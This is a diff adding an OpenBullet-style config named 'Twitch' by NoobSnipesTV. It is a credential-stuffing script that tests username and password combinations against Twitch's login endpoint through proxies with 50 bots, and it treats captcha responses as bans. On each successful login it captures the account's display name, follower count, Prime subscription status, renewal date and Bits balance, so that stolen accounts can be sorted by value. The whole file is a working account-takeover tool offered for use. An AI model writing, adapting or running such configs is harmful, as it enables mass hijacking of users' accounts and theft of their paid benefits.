@@ -1,0 +1,99 @@
+[SETTINGS]
+{
+  "Name": "Twitch",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-01T14:49:23.4838988-05:00",
+  "AdditionalInfo": "",
+  "Author": "NoobSnipesTV",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://passport.twitch.tv/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"client_id\":\"kimne78kx3ncx6brgo4mv6wki5h1ko\"}" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.twitch.tv" 
+  HEADER "referer: https://www.twitch.tv/" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "user credentials incorrect" 
+    KEY "invalid password" 
+    KEY "no account linked to email or phone number" 
+    KEY "multiple accounts linked to email" 
+  KEYCHAIN Ban OR 
+    KEY "captcha incorrect" 
+PARSE "<COOKIE>" LR "" "name" -> VAR "Name" 
+PARSE "<SOURCE>" LR "token\":\"" "\"}" -> VAR "token" 
+REQUEST GET "https://api.twitch.tv/kraken/channels/<Name>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/vnd.twitchtv.v3+json" 
+  HEADER "Referer: https://www.twitch.tv/" 
+  HEADER "client-id: jzkbprff40iqj646a697cyrvl0zt2m6" 
+PARSE "<SOURCE>" LR "display_name\":\"" "\",\"" -> CAP "Username" 
+PARSE "<SOURCE>" LR "followers\":" ",\"" -> CAP "Followers" 
+REQUEST POST "https://gql.twitch.tv/gql" 
+  CONTENT "[{\"operationName\":\"PrimeSubscribe_UserPrimeData\",\"variables\":{\"login\":\"noobsnipestv\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"58c25a2b0ccbde33498f3a5cf6027ff32168febd8a63b749f184028e8ab9192a\"}}}]" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: gql.twitch.tv" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://www.twitch.tv" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Authorization: OAuth <token>" 
+  HEADER "Client-Id: kimne78kx3ncx6brgo4mv6wki5h1ko" 
+  HEADER "X-Device-Id: e761b5c03edbd6ae" 
+  HEADER "Referer: https://www.twitch.tv/noobsnipestv" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+PARSE "<SOURCE>" LR "\"renewalDate\":" ",\"__typename\"" -> CAP "Date" 
+PARSE "<SOURCE>" LR "{\"canPrimeSubscribe\":" ",\"primeSubCreditBenefit" -> CAP "Prime Available" 
+REQUEST POST "https://gql.twitch.tv/gql" 
+  CONTENT "[{\"operationName\":\"GDPRConsent\",\"variables\":{},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"6a365b595979152ac69a5449a7d46283f346a9a7f518febe91be05c958b31516\"}}},{\"operationName\":\"Ads_Components_AdManager_User\",\"variables\":{},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"1fd9eeac7ab98004ee00dc6554e88759f1fa66ea94b97487f69b1ddf3a9d215b\"}}},{\"operationName\":\"TopNav_CurrentUser\",\"variables\":{},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"625a9b3015d5956f18a813ecb7619bcbdccd037cdafcb64c31c2f98c009e71b5\"}}},{\"operationName\":\"Algolia_RequestInfo\",\"variables\":{},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"53a624acee2ecd22dd652c6c7beb352e30a62fc91260cf10d4a687cf08c881c0\"}}},{\"operationName\":\"Prime_PrimeOffers_CurrentUser\",\"variables\":{},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"a773b7efefe390d49753520f7db73d03794b008af6acc22c06a2c630d46d5518\"}}},{\"operationName\":\"TopNav_User_CurrentUser\",\"variables\":{},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"ebecf4db6b9e34a9e19fb787996798e4f72341a142299f9e40b6ec45f913a0a0\"}}},{\"operationName\":\"SideNav_FeaturedChannels\",\"variables\":{\"language\":\"en-gb\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"b64cecdbaf6f4ae14250df0d2d6be0cbf947de89d4a66b833f92bbea66055328\"}}},{\"operationName\":\"FollowedChannels\",\"variables\":{\"limit\":100,\"cursor\":\"\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"67214adf8092b84502faa1df594eb6d6b3da958199cc32b2f16e115c2197c4bc\"}}},{\"operationName\":\"RecommendedChannels\",\"variables\":{\"first\":10,\"language\":\"\",\"recID\":\"292a93c9-2901-45b3-9376-a7b0bc96eea5\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"82a726e59e1aac4ca0338886d67a87898257730f29395605a755d61ed30cadd8\"}}},{\"operationName\":\"OnlineFriends\",\"variables\":{},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"ebfa0e09831107646f8a9167de4f18c98a6a8f8b489dd34eb2c820f5afd7e117\"}}}]" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://www.twitch.tv/inventory" 
+  HEADER "Authorization: OAuth <token>" 
+  HEADER "client-id: jzkbprff40iqj646a697cyrvl0zt2m6" 
+PARSE "<SOURCE>" LR "hasPrime\":" ",\"" -> VAR "Prime" 
+FUNCTION Constant "<Prime>" -> CAP "Prime" 
+REQUEST POST "https://gql.twitch.tv/gql" 
+  CONTENT "[{\"operationName\":\"Inventory_DropsList_CurrentUser\",\"variables\":{\"itemNamesEnabled\":true},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"d51dcf0b488e3e2b4e26bb973ebb985c6b01197371e949a0ed8fecdf5f8cb334\"}}},{\"operationName\":\"Inventory\",\"variables\":{},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"22c44231a1332132801f93866bdf1c985995df85e87e2dec45a24fbb66e9a03c\"}}}]" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://www.twitch.tv/inventory" 
+  HEADER "Authorization: OAuth <token>" 
+  HEADER "client-id: jzkbprff40iqj646a697cyrvl0zt2m6" 
+PARSE "<SOURCE>" LR "bitsBalance\":" ",\"" -> VAR "Bits" 
+FUNCTION Constant "<Bits>" -> CAP "Bits" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" AND 
+    KEY "<Bits>" LessThan "100" 
+    KEY "<Prime>" EqualTo "false" 
